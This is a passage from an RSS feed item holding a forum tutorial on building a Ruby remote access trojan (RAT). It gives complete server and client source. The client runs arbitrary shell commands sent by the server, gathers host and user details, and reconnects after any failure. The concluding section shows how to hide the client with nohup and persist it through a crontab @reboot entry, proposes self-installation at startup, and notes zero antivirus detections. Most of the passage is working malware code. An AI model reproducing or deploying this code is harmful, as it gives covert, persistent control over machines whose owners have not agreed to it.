+<p>As we’ve seen, sockets can’t tell us if they’re alive or not, the only way to tell is to send bytes over the wire and check the response. Thats exactly what the <code>heartbeat</code> method will do, named after so-called <a href="https://en.wikipedia.org/wiki/Heartbeat_(computing)" rel="noopener nofollow ugc">heartbeat pings</a>.</p>
+<p>In our client implementation, we will anticipate the <code>'heartbeat'</code> message and respond with <code>'alive'</code>. If a client is unable to respond correctly then we know it is down, and we call <code>destroy_client(id)</code> on it.</p>
+<pre><code class="lang-auto">  def heartbeat
+    # Check if clients are still alive and responding, remove otherwise
+    get_clients.each do |temp_client|
+      send_client('heartbeat', temp_client)
+      beat = recv_client(temp_client)
+      destroy_client(temp_client.uid) if beat != 'alive'
+    end
+    puts "Heartbeat Finished - All non-responding clients removed.".green
+  end
+</code></pre>
+<p>Sometimes we’ll want to shut our server down, but keep the clients running, so that we can start the server later and the clients will be waiting to reconnect. This will be the <code>quit</code> method.</p>
+<p>Or we’ll want to shut it all down - send <code>'destroy'</code> to every client and then close the server. For this we’ll define <code>hardexit</code>.</p>
+<pre><code class="lang-auto">  def quit
+    print "Exit server but keep clients active? [y/n]: "
+    inp = $stdin.gets.chomp.downcase
+    exit 0 if inp == 'yes' || inp == 'y'
+  end
+
+  def hardexit
+    print "Exit server and destroy all clients? [y/n]: "
+    inp = $stdin.gets.chomp.downcase
+    if inp == 'yes' || inp == 'y'
+      get_clients.each { |client| send_client('destroy', client) }
+      exit 0
+    end
+  end
+end
+</code></pre>
+<p>Thats our Server class finished! If you’re feeling ambitious, add a few custom methods to Server that improves upon it. An example would be a <code>broadcast(cmd)</code> that sends <code>cmd</code> to every client in <code>@clients</code>.</p>
+<hr>
+<h3>Using the Server</h3>
+<p>We will finish <code>server.rb</code> with 3 final methods(not in Server class). <code>help</code> for printing available commands, <code>get_input</code> for getting input from the server admin and <code>start</code> which will launch our server and wait for input.</p>
+<p>In <code>start</code> we will define arrays of client-specific and server commands. They will be passed to <code>help</code> so that the admin can view them.</p>
+<pre><code class="lang-auto">def help(server_cmds, client_cmds)
+  puts "Server Commands:".green
+  server_cmds.each { |gen| puts "- #{gen}" }
+  puts "\nClient Commands:".green
+  client_cmds.each { |cli| puts "- #{cli}" }
+end
+</code></pre>
+<p><code>get_input</code> is very simple, by using a default parameter <code>prompt</code> we’ll have a base prompt for our RAT. <code>$stdin.gets.chomp</code> will wait for terminal text input and return it.</p>
+<pre><code class="lang-auto">def get_input(prompt = 'ryat&gt;')
+  print "#{prompt} "
+  $stdin.gets.chomp
+end
+</code></pre>
+<p>Now for our final method in <code>server.rb</code>, <code>start</code> will launch a new Server, deal with admin input and print data from clients.</p>
+<p>We assign a port from terminal arguments, <code>./server.rb 4000</code> if its passed, otherwise we give it a default value with <code>port ||= 3200</code>. The <code>server.run</code> method is placed in a Thread, so that it can run in parallel with <code>start</code>.</p>
+<p>We define our arrays of commands - <code>client_cmds</code> will only work when <code>@current_client</code> is set. <code>server_cmds</code> will be available for use at all times.</p>
+<pre><code class="lang-auto">def start
+  port = ARGV[0]
+  port ||= 3200
+
+  client = nil
+  data = nil
+  history = []
+  server = Server.new(port)
+
+  Thread.new { server.run }
+  puts "Sever started on port #{port}".green
+
+  client_cmds = %w[
+    exe ls pwd pid ifconfig system
+  ]
+
+  server_cmds = %w[
+    help select unselect clients heartbeat history destroy hardexit exit
+  ]
+</code></pre>
+<p>Now we’re ready to parse admin input. The remaining code in <code>start</code> will be contained in a <code>loop do...end</code> for interactivity.</p>
+<p>First we use our <code>get_input</code> method, and ensure we pass <code>server.current_client.uid</code> to the prompt if a client is selected, otherwise the prompt will default to <code>'ryat&gt; '</code>.</p>
+<p><code>next</code> is the Ruby equivalent to <code>continue</code> in other languages, the execution will jump back to the start of the <code>loop do...end</code> if <code>input.nil?</code>. We also store commands made in <code>history</code> array similarly to <code>cat ~/.bash_history</code>.</p>
+<pre><code class="lang-auto">  loop do
+    if server.current_client.nil?
+      input = get_input
+    else
+      input = get_input("ryat (Client #{server.current_client.uid})&gt; ")
+    end
+
+    next if input.nil?
+    history.push(input)
+    cmd, action = input.split(' ')
+
+    if client_cmds.include?(input) &amp;&amp; server.current_client.nil?
+      puts "Client specific command used".red
+      puts "Select a client first (#{server.client_count} available)".red
+      next
+    end
+</code></pre>
+<p>Now we must act upon the admin’s input. As we’re comparing against string literals, we’ll use a large <code>case...end</code>, Ruby’s equivalent to <code>switch</code>. Note that in a <code>case...end</code> it is Ruby style not to indent the <code>when</code> because a <code>case...end</code> doesn’t create a new scope.</p>
+<p>First we’ll add the server commands, most of which will call a method from our <code>server</code> object.</p>
+<pre><code class="lang-auto">    case cmd
+    # Server Commands
+    when 'help'
+      help(server_cmds, client_cmds)
+    when 'select'
+      server.select_client(action.to_i)
+    when 'unselect'
+      server.unselect
+    when 'clients'
+      server.list_clients
+    when 'heartbeat'
+      server.heartbeat
+    when 'hardexit'
+      server.hardexit
+    when 'history'
+      history.each_with_index { |cmd, i| puts "#{i}: #{cmd}"}
+    when 'destroy'
+      server.destroy_client(action.to_i)
+    when 'exit'
+      server.quit
+      next # Only reached if the admin doesn't confirm exit
+    when 'hardexit'
+      server.hardexit
+      next
+</code></pre>
+<p>Continuing on in the same <code>case...end</code> we add the client commands. Most commands such as <code>ls</code>, <code>pwd</code> and <code>pid</code> are added to a single <code>when</code> as we can send them directly as <code>cmd</code>.</p>
+<p>The <code>exe</code> command is special though, as we want to send the entire input. This allows us to send long bash commands to the client like <code>exe wget -r --tries=10 www.google.com</code>.</p>
+<p>If we get <code>data</code> back from a command, we’ll then print it with <code>puts data unless data.nil?</code>. Then reset <code>data</code> back to nil so it doesn’t interfere with the next command. Finally we call <code>start()</code>, setting our server in motion.</p>
+<pre><code class="lang-auto">    # Client Commands
+    when 'exe'
+      next if action.nil?
+      server.send_client(input, server.current_client)
+      data = server.recv_client(server.current_client)
+    when 'ls', 'pwd', 'pid', 'ifconfig', 'system'
+      server.send_client(cmd, server.current_client)
+      data = server.recv_client(server.current_client)
+    else
+      puts "Unknown command: #{input}. Enter 'help' for available commands.".red
+    end
+    puts data unless data.nil?
+    data = nil
+  end
+end
+
+start()
+</code></pre>
+<p>We’ve finished <code>server.rb</code>, try it out with <code>./server.rb 4000</code> and you should be greeted with a friendly <code>Server has started on port 4000</code> and a prompt. If you get a Socket error, try running the server on a different port.</p>
+<p>Maybe put your own spin on the server, complete with ASCII art and custom commands <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<hr>
+<h3>The Client</h3>
+<p>If you’ve made it this far, great, the hard part is over. The client is far shorter than the server. The client has 2 jobs - execute commands and stay running no matter what.</p>
+<h4>helpers.rb</h4>
+<p>The client will be composed of 2 scripts, <code>helpers.rb</code> and <code>client.rb</code>. We’ll write <code>helpers.rb</code> first, it will contain a short module that we will use in <code>client.rb</code>.</p>
+<pre><code class="lang-auto">require 'socket'
+require 'etc'
+
+module Helpers
+  def self.exe(cmd)
+    # `` executes bash command in Ruby
+    `#{cmd}`
+  end
+
+  def self.ls
+    `ls`
+  end
+
+  def self.pwd
+    Dir.pwd
+  end
+
+  def self.pid
+    Process.pid
+  end
+
+  def self.ifconfig
+    # With || 'ip a' will run if 'ifconfig' is not installed
+    `ifconfig || ip a`
+  end
+
+  def self.system
+    result = "OS: " + RUBY_PLATFORM + "\n"
+    result += "Architecture: " + `uname -m`
+    result += "Hostname: " + Socket.gethostname + "\n"
+    result += "User: " + Etc.getlogin
+  end
+end
+</code></pre>
+<p>Here is where Ruby really shines as a scripting language - we don’t mess around with <code>system()</code> or <code>popen()</code> functions like in other languages. Anything we want executed as a bash command is placed in-between `` backticks.</p>
+<p>In this version the <code>self.pwd</code> method uses <code>Dir.pwd</code>, a Ruby built-in for finding the present working directory. See if you can use a `` bash command to recreate it.</p>
+<p><code>require 'etc'</code> gives us access to the Ruby built-in module for accessing information generally stored in the /etc directory. In this version we grab the current logged in user with <code>Etc.getlogin</code>. Other information like <code>Etc.passwd</code> to get the hashed password is available too. The <a href="https://ruby-doc.org/stdlib-2.5.3/libdoc/etc/rdoc/Etc.html" rel="noopener nofollow ugc">Etc Documentation</a> could be useful to you.</p>
+<h4>client.rb</h4>
+<p>We need the client to have solid error handling to avoid crashes, and to be ready to receive and execute commands.</p>
+<p>We use <code>require_relative "helpers.rb"</code> to bring the <code>Helpers</code> module into <code>client.rb</code>. We’re also bringing in <code>socket</code> and <code>etc</code> as they were in <code>helpers.rb</code>, similarly to how C++ header files work.</p>
+<pre><code class="lang-auto">#!/usr/bin/env ruby
+
+require_relative "helpers.rb"
+</code></pre>
+<p>We will have 2 methods in <code>client.rb</code>, <code>handle_client</code> and <code>main</code>. Once a client has been created and passed to <code>handle_client</code> we enter a <code>loop do...end</code> that listens for server commands with <code>data = client.recv(1024)</code>.</p>
+<p>1024 is the max number of bytes the client can read from the server in a single message, if you expect your server could be sending larger messages set a larger number.</p>
+<p>Once we’ve received the servers command, we use a <code>case...end</code> to call the correct <code>Helpers</code> method, execute it and hold the output in <code>result</code>.</p>
+<p>If you recall from the Server <code>client_recv</code> checked the length of the message being sent and then read in that length in bytes. This works because we send <code>client.puts(result.length)</code>  directly before we write the actual message with <code>client.write(result)</code> in <code>handle_client</code>.</p>
+<pre><code class="lang-auto">def handle_client(client)
+  loop do
+    result = ''
+    data = client.recv(1024)
+    next if data.nil?
+    cmd, action = data.split ' '
+
+    case cmd
+    when 'heartbeat'
+      result = 'alive'
+    when 'exe'
+      result = Helpers.exe(data.gsub('exe ', ''))
+    when 'ls'
+      result = Helpers.ls
+    when 'pwd'
+      result = Helpers.pwd
+    when 'pid'
+      result = Helpers.pid
+    when 'ifconfig'
+      result = Helpers.ifconfig
+    when 'system'
+      result = Helpers.system
+    when 'destroy'
+      return 42
+    end
+
+    result = result.to_s
+    client.puts(result.length)
+    client.write(result)
+  end
+end
+</code></pre>
+<p>We don’t have any error handling in <code>handle_client</code> because we intend for errors to come back out to <code>main</code> and get caught there.</p>
+<p>When <code>main</code> is first called, we enter the first <code>loop do...end</code>. Here <code>client = nil</code> will reset the old client if it existed from previous iterations. We then attempt to create a new <code>TCPSocket</code> object called <code>client</code>.</p>
+<p>At this point if the Server is down an <code>EAFNOSUPPORT</code> error will occur as the socket port is not available for the client. Without the <code>begin...rescue Exception...end</code> blocks our client would crash. Instead we print the error, then <code>sleep(timeout)</code> pausing the programs execution for timeout in seconds.</p>
+<p>Once the program’s execution begins again, it will move through the entire <code>loop do...end</code> and reach <code>TCPSocket.new</code> again. This will continue indefinitely until the Server is up and there is no Exception to <code>rescue</code>.</p>
+<pre><code class="lang-auto">def main(host, port, timeout)
+  # Main loop to repeatedly attempt server connection
+  loop do
+    client = nil
+    begin
+      client = TCPSocket.new(host, port)
+    rescue Exception =&gt; e
+      puts e.message
+      puts e.backtrace
+      sleep(timeout)
+    end
+
+    exit_code = 0
+    begin
+      exit_code = handle_client(client)
+    rescue Interrupt
+      exit 0
+    rescue Exception =&gt; e
+      puts e.message
+      puts e.backtrace
+    end
+
+  exit 0 if exit_code == 42
+  end
+end
+</code></pre>
+<p>I choose to use 42 as a signal to fully <code>exit 0</code> the client. Any number/string could be used for the <code>exit_code</code>.</p>
+<p>You might be wondering why we don’t <code>exit 0</code> directly from <code>handle_client</code> when we receive the <code>'destroy'</code> message. This is due to the error handling of <code>rescue Exception</code> catching <em>all exceptions</em> and even <code>exit</code> is considered an exception.</p>
+<p>We finish our RAT by setting optional command-line arguments for <code>client.rb</code> and calling <code>main</code>.</p>
+<pre><code class="lang-auto">host = ARGV[0]
+port = ARGV[1]
+
+# If host/port is not passed in ARGV, default to localhost:3200
+host ||= "localhost"
+port ||= 3200
+timeout = 2
+
+main(host, port, timeout)
+</code></pre>
+<h3>Conclusion</h3>
+<p>We can now launch clients with <code>./client.rb localhost 4000</code>. If a server was listening on locahost:4000 the text <code>New Connection: ID: 1 IP: 127.0.0.1</code> should appear in your server terminal.</p>
+<p>So lets say you’ve got a server running on port 4000, you get the LAN IP of the server machine using <code>ifconfig</code> or <code>ip addr</code>, and its <code>192.168.1.8</code>. Now if you  have a spare laptop or virtual machine copy <code>client.rb</code> and <code>helpers.rb</code> to it. Run <code>./client.rb 192.168.1.8 4000</code>, if all went well, you’ll have a new connection <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
+<p>To run <code>client.rb</code> in the background, you can use <code>nohup ruby client.rb &amp;</code>.</p>
+<p>Setting <code>client.rb</code> to run on startup is very possible, but will be different depending on the target distro. One approach for systems using <a href="https://en.wikipedia.org/wiki/Cron" rel="noopener nofollow ugc">cron</a> is <code>crontab -e</code> and adding <code>@reboot /path/to/client.rb</code>. Maybe in your version <code>client.rb</code> could automatically add itself to startup.</p>
+<p>As expected from Ruby scripts without any malicious functionality like keylogging, <code>client.rb</code>, <code>helpers.rb</code> and <code>server.rb</code> have 0 detections from virustotal.</p>
+<p><a href="https://www.virustotal.com/gui/file/a18cdebfa39c73f0bd487742610937a317e1c7ec02f362dbe3887be11688ffdc/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/a18cdebfa39c73f0bd487742610937a317e1c7ec02f362dbe3887be11688ffdc/detection</a></p>
+<p><a href="https://www.virustotal.com/gui/file/4bcf6300d01533e49085c82282e029d82848bd46b3a48909730c1303c2e4c29b/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/4bcf6300d01533e49085c82282e029d82848bd46b3a48909730c1303c2e4c29b/detection</a></p>
+<p><a href="https://www.virustotal.com/gui/file/0d107e5e74bbd130fdad17fa495dfa73978550457aca469048840b6d0d5ae8be/detection" class="onebox" target="_blank" rel="noopener nofollow ugc">https://www.virustotal.com/gui/file/0d107e5e74bbd130fdad17fa495dfa73978550457aca469048840b6d0d5ae8be/detection</a></p>
+<p>Thank you for reading! Let me know of any improvements or suggestions.</p>
+          <p><a href="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919/1</link>
+        <pubDate>Tue, 16 Feb 2021 19:34:16 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-24919-1</guid>
+        <source url="https://0x00sec.org/t/how-to-build-your-own-ruby-rat/24919.rss">How-to Build Your Own Ruby RAT</source>
+      </item>
+  </channel>
+</rss>
